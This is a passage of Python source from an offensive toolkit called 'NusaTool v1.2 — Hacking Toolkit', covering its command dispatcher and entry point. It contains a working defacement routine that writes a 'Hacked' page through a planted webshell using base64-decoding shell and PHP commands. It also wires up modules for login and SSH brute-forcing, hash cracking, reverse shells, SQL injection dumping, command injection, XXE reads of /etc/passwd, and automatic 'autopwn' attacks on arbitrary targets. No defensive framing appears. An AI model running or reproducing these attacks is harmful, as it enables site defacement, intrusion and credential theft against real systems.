                content = a.content or f"""<!DOCTYPE html><html><head><title>Hacked</title><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{{background:#000;color:#0f0;text-align:center;padding-top:20vh;font-family:monospace}}h1{{font-size:4em;text-shadow:0 0 20px #0f0}}blink{{font-size:1.5em}}</style></head><body><h1>🔥 {msg} 🔥</h1><p style="color:#888">This site has been defaced via NusaTool</p></body></html>"""
                if a.file:
                    try:
                        with open(a.file) as f: content = f.read()
                    except Exception as e:
                        print(f"  {R}✘{N} Failed to read file: {e}"); return
                header("DEFACE — VIA WEBSHELL")
                print(f"  {C}◉{N} Webshell : {Y}{a.url}{N}")
                print(f"  {C}◉{N} Target   : {Y}{a.target_file}{N}")
                print(f"  {C}◉{N} Size     : {Y}{len(content)}B{N}")
                ws = WebShell(a.url, BypassEngine(a.url, a.proxy))
                b64 = base64.b64encode(content.encode()).decode()
                cmds = [
                    f"echo '{b64}' | base64 -d > {a.target_file} && echo OK",
                    f"echo '{b64}' | openssl enc -base64 -d > {a.target_file} && echo OK",
                    f"php -r \"file_put_contents('{a.target_file}',base64_decode('{b64}'));echo'OK';\"",
                ]
                done = False
                for cmd in cmds:
                    out = ws.exec_cmd(a.url, cmd)
                    if out and "OK" in out:
                        base_url = a.url.split('?')[0].rsplit('/', 1)[0]
                        print(f"  {G}✔{N} {BOLD}DEFACED{N} {Y}{base_url}/{a.target_file}{N}")
                        print(f"  {W}Verify: {base_url}/{a.target_file}{N}")
                        done = True
                        break
                if not done:
                    print(f"  {R}✘{N} Deface via webshell failed. Check webshell URL.")
            else:
                dt = DefaceTester(a.url, BypassEngine(a.url, a.proxy))
                if a.file or a.content:
                    dt.deface(filepath=a.file, content=a.content, captcha_answer=a.captcha)
                else:
                    dt.scan()
        elif module in ("hashcrack", "hash"):
            p = argparse.ArgumentParser(prog="hashcrack")
            p.add_argument("-t","--target",required=True,help="Target hash")
            p.add_argument("-w","--wordlist",required=True)
            p.add_argument("--type",choices=["auto","md5","sha1","sha224","sha256","sha384","sha512"],default="auto")
            p.add_argument("--threads",type=int,default=4)
            a = p.parse_args(args); HashCracker(a.target,a.wordlist,a.type,a.threads).run()
        elif module == "loginbf":
            p = argparse.ArgumentParser(prog="loginbf")
            p.add_argument("-u","--url",required=True); p.add_argument("-U","--usernames",required=True); p.add_argument("-P","--passwords",required=True)
            p.add_argument("--user-field",default="username"); p.add_argument("--pass-field",default="password")
            p.add_argument("--fail-string",default="incorrect"); p.add_argument("--method",default="POST")
            p.add_argument("--threads",type=int,default=1); p.add_argument("--delay",type=float,default=0)
            p.add_argument("--mode",choices=["form","json","basic","bearer"],default="form")
            p.add_argument("--proxy")
            a = p.parse_args(args)
            LoginBruteforcer(a.url,a.usernames,a.passwords,
                user_f=a.user_field, pass_f=a.pass_field,
                fail_s=a.fail_string, method=a.method,
                threads=a.threads, delay=a.delay,
                mode=a.mode, proxy=a.proxy,
                bypass=BypassEngine(a.url)).run()
        elif module == "report":
            p = argparse.ArgumentParser(prog="report")
            p.add_argument("-o","--output",default="nusatool_report.html"); p.add_argument("--json",action="store_true"); p.add_argument("--csv",action="store_true")
            a = p.parse_args(args)
            if a.json: ReportGenerator().generate_json(f=a.output.replace(".html",".json"))
            elif a.csv: ReportGenerator().generate_csv(f=a.output.replace(".html",".csv"))
            else: ReportGenerator().generate_html(a.output)
        elif module in ("autohack", "autohack"):
            p = argparse.ArgumentParser(prog="autohack")
            p.add_argument("target",nargs="?"); p.add_argument("-u","--url",dest="uflag")
            p.add_argument("-t","--target",dest="tflag"); p.add_argument("--lhost"); p.add_argument("--lport",type=int,default=4444)
            p.add_argument("--threads",type=int,default=20); p.add_argument("--proxy")
            a = p.parse_args(args)
            target = a.uflag or a.tflag or a.target
            if not target: print("[-] Usage: autohack <target> --lhost <ip>"); return
            AutoHack(target, a.lhost, a.lport, a.threads, a.proxy).run()
        elif module == "webshell":
            p = argparse.ArgumentParser(prog="webshell")
            p.add_argument("-u","--url",required=True); p.add_argument("--shell",default="php")
            p.add_argument("--method",choices=["auto","put","post"],default="auto"); p.add_argument("--proxy")
            a = p.parse_args(args); WebShell(a.url, BypassEngine(a.url, a.proxy)).run(a.shell, a.method)
        elif module in ("revshell","reverseshell"):
            p = argparse.ArgumentParser(prog="revshell")
            p.add_argument("--lhost",required=True); p.add_argument("--lport",type=int,default=4444)
            p.add_argument("--lang",default="bash"); p.add_argument("--urlencode",action="store_true")
            a = p.parse_args(args); ReverseShell(a.lhost, a.lport).run(a.lang, a.urlencode)
        elif module == "lfi":
            p = argparse.ArgumentParser(prog="lfi")
            p.add_argument("-u","--url",required=True); p.add_argument("--param",required=True); p.add_argument("--proxy")
            a = p.parse_args(args); LFIExploiter(a.url, a.param, BypassEngine(a.url, a.proxy)).scan()
        elif module in ("sqlauto","sqlautodump"):
            p = argparse.ArgumentParser(prog="sqlauto")
            p.add_argument("-u","--url",required=True); p.add_argument("--param"); p.add_argument("--proxy")
            a = p.parse_args(args); SQLAutoExploit(a.url, "GET", a.param, BypassEngine(a.url, a.proxy)).dump_all()
        elif module == "cms":
            p = argparse.ArgumentParser(prog="cms")
            p.add_argument("-u","--url",required=True); p.add_argument("--proxy")
            a = p.parse_args(args); CMSExploiter(a.url, BypassEngine(a.url, a.proxy)).run()
        elif module in ("svcexploit","servicex"):
            p = argparse.ArgumentParser(prog="svcexploit")
            p.add_argument("--target",required=True); p.add_argument("-u","--user",required=True)
            p.add_argument("-p","--pass",dest="password",required=True); p.add_argument("--service",default="ssh")
            p.add_argument("--port",type=int)
            a = p.parse_args(args)
            ServiceExploiter(a.target, a.user, a.password, a.port).run([a.service])
        elif module in ("blindsqli", "blind-sqli"):
            p = argparse.ArgumentParser(prog="blindsqli")
            p.add_argument("-u","--url",required=True); p.add_argument("--param",required=True)
            p.add_argument("--tech",choices=["auto","boolean","time"],default="auto")
            p.add_argument("--delay",type=float,default=2); p.add_argument("--proxy")
            a = p.parse_args(args)
            BlindSQLiExploiter(a.url, a.param, "GET", a.tech, a.delay, BypassEngine(a.url, a.proxy)).dump_all()
        elif module in ("svcbrute", "servicebrute"):
            p = argparse.ArgumentParser(prog="svcbrute")
            p.add_argument("-t","--target",required=True); p.add_argument("--service",default="ssh")
            p.add_argument("--port",type=int); p.add_argument("--threads",type=int,default=5)
            p.add_argument("-U","--usernames"); p.add_argument("-P","--passwords"); p.add_argument("--proxy")
            a = p.parse_args(args)
            ServiceBruteforcer(a.target, a.port, a.service, a.usernames, a.passwords, a.threads).run()
        elif module == "ssrf":
            p = argparse.ArgumentParser(prog="ssrf")
            p.add_argument("-u","--url",required=True); p.add_argument("--param",required=True); p.add_argument("--proxy")
            a = p.parse_args(args); SSRFExploiter(a.url, a.param, BypassEngine(a.url, a.proxy)).scan()
        elif module == "ssti":
            p = argparse.ArgumentParser(prog="ssti")
            p.add_argument("-u","--url",required=True); p.add_argument("--param",required=True)
            p.add_argument("--cmd",default="id;hostname"); p.add_argument("--proxy")
            a = p.parse_args(args)
            ssti = SSTIExploiter(a.url, a.param, BypassEngine(a.url, a.proxy))
            ssti.detect(); ssti.exec_cmd(a.cmd)
        elif module == "xxe":
            p = argparse.ArgumentParser(prog="xxe")
            p.add_argument("-u","--url",required=True); p.add_argument("--param",required=True)
            p.add_argument("--file",default="/etc/passwd"); p.add_argument("--proxy")
            a = p.parse_args(args); XXEExploiter(a.url, a.param, BypassEngine(a.url, a.proxy)).read_file(a.file)
        elif module == "cmdi":
            p = argparse.ArgumentParser(prog="cmdi")
            p.add_argument("-u","--url",required=True); p.add_argument("--param",required=True)
            p.add_argument("--cmd",default="id"); p.add_argument("--proxy")
            a = p.parse_args(args)
            cmdi = CmdInjectionExploiter(a.url, a.param, BypassEngine(a.url, a.proxy))
            cmdi.detect(); cmdi.exec_cmd(a.cmd)
        elif module == "nosqli":
            p = argparse.ArgumentParser(prog="nosqli")
            p.add_argument("-u","--url",required=True); p.add_argument("--proxy")
            a = p.parse_args(args)
            NoSQLiExploiter(a.url, a.url.split("?")[1] if "?" in a.url else "", BypassEngine(a.url, a.proxy)).scan()
        elif module == "graphql":
            p = argparse.ArgumentParser(prog="graphql")
            p.add_argument("-u","--url",required=True); p.add_argument("--endpoint",default="/graphql")
            p.add_argument("--query"); p.add_argument("--proxy")
            a = p.parse_args(args); GraphQLExploiter(a.url, a.endpoint, BypassEngine(a.url, a.proxy)).scan()
        elif module == "jwt":
            p = argparse.ArgumentParser(prog="jwt")
            p.add_argument("token",help="JWT token to audit"); p.add_argument("--weaklist")
            a = p.parse_args(args); JWTExploiter(a.token).scan()
        else:
            print(f"  {R}✘{N} Unknown: {Y}{module}{N}")
            print(f"  {C}◈{N} Available: {G}autohack autopwn webshell revshell lfi sqlauto blindsqli cms svcexploit svcbrute scan cors csrf urlscan portscan servicedetect xss sqli deface subdomain dns whois dirbust loginbf autobf hashcrack paramspider report session update dork ssrf ssti xxe cmdi nosqli graphql jwt{N}")
    except SystemExit: pass
    except Exception as e: print(f"  {R}✘ Error:{N} {e}")

def main():
    p = argparse.ArgumentParser(description="NusaTool v1.2 — Hacking Toolkit")
    p.add_argument("--version", action="version", version=f"NusaTool v{VERSION}")
    p.add_argument("--proxy", help="Proxy URL (e.g. socks5://127.0.0.1:9050)")
    if len(sys.argv) == 1: NusaCLI().run(); return
    if sys.argv[1] in ("-h","--help"): p.print_help(); print(f"\n  Run {C}nusatool.py{N} for interactive CLI\n"); return
    if sys.argv[1] == "--version": print(f"NusaTool v{VERSION}"); return
    if sys.argv[1] == "update": check_update(); return
    if not sys.argv[1].startswith("-") and sys.argv[1] not in (
        "autohack","autopwn","scan","cors","csrf","cve","urlscan","portscan",
        "servicedetect","xss","sqli","subdomain","dns","whois","dirbust",
        "loginbf","hashcrack","hash","report","paramspider","deface","autobf",
        "autologin","help","webshell","revshell","reverseshell","lfi","sqlauto",
        "sqlautodump","cms","svcexploit","servicex","blindsqli","blind-sqli",
        "svcbrute","servicebrute","session","update","dork",
        "ssrf","ssti","xxe","cmdi","nosqli","graphql","jwt"):
        AutoPwn(sys.argv[1]).run(); return
    print(BANNER); direct(sys.argv[1], sys.argv[2:])

if __name__ == "__main__":
    main()
